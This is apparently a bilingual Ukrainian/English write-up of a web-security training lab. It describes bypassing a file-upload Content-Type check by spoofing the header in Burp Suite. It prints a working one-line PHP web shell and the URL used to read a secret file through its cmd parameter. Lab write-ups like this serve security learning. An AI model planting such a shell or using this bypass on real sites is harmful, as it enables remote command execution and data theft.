@@ -1,0 +1,48 @@
+**Мета:** Обійти перевірку Content-Type і завантажити PHP web shell для читання файлу `/home/carlos/secret`.
+
+**Вразливість:** File Upload — сайт перевіряє `Content-Type`, але не перевіряє розширення файлу.
+
+**Objective:** Bypass the `Content-Type` check and upload a PHP web shell to read the file `/home/carlos/secret`.
+
+**Vulnerability:** File Upload — the site checks the `Content-Type` but does not validate the file extension.
+
+---
+
+## Steps Taken:
+
+1. Logged into my account on the lab website.
+2. Navigated to the `/my-account/avatar` page.
+3. Attempted to upload `shell.php`:
+<?php system($_GET['cmd']); ?>
+
+Received an error:
+Sorry, file type application/x-php is not allowed
+Only image/jpeg and image/png are allowed
+
+Intercepted the request using Burp Suite.
+
+Modified the header:
+Content-Type: application/x-php → image/png
+
+Sent the request — the file was uploaded successfully.
+
+Accessed the uploaded file in the browser:
+https://<lab-id>.web-security-academy.net/files/avatars/shell.php
+
+Executed a command to read the flag:
+https://<lab-id>.web-security-academy.net/files/avatars/shell.php?cmd=cat /home/carlos/secret
+
+Retrieved the flag.
+
+Payload:
+<?php system($_GET['cmd']); ?>
+
+Burp Intercept:
+Content-Type: image/png
+
+Why it worked:
+The site checked the `Content-Type` (which can be spoofed) but failed to validate the file extension.
+
+The PHP file was saved with a `.php` extension and is executed by the server.
+
+Commands can be executed via the `cmd` parameter.
